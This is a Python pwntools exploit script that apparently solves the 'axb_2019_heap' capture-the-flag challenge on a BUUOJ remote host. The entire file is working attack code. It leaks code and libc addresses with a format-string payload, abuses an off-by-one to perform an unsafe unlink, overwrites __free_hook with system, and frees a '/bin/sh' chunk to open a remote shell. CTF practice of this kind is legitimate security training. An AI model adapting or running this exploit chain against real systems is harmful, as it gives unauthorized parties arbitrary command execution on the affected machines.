from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./axb_2019_heap"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("./axb", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 27474)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(index, size, con):
    sa(">> ", "1")
    sla("Enter the index you want to create (0-10):", str(index))
    sla("Enter a size:\n", str(size))
    sa("Enter the content: \n", con)

def free(index):
    sa(">> ", "2")
    sla("Enter an index:\n", str(index))

def show():
    sa(">> ", "3")

def edit(index, con):
    sa(">> ", "4")
    sla("Enter an index:\n", str(index))
    sa("Enter the content: \n", con)


# format string + off by one

# leak
libc = ELF(libc_path)

fmt = b"%11$p-%15$p"
sla("Enter your name: ", fmt)
ru("Hello, ")
code_base = int(rud("-"), 16)-0x1186
print("code_base: ", hex(code_base))
libc_base = int(rud("\n"), 16)-240-libc.sym["__libc_start_main"]
print("libc_base: ", hex(libc_base))

# count
system = libc_base+libc.sym["system"]
free_hook = libc_base+libc.sym["__free_hook"]

# unlink
note = code_base+0x0202060
fd = note-0x18
bk = note-0x10

add(0, 0x98, "a\n")
add(1, 0x90, "a\n")
add(2, 0x90, "/bin/sh\x00\n")
pad = p64(0)+p64(0x91)+p64(fd)+p64(bk)
pad += cyclic(0x70)+p64(0x90)+p8(0xa0)
edit(0, pad)
free(1)

# alter free_hook to system
pad = cyclic(0x18)+p64(free_hook)+p64(0x10)+b"\n"
edit(0, pad)
edit(0, p64(system)+b"\n")

# attack
free(2)

shell()


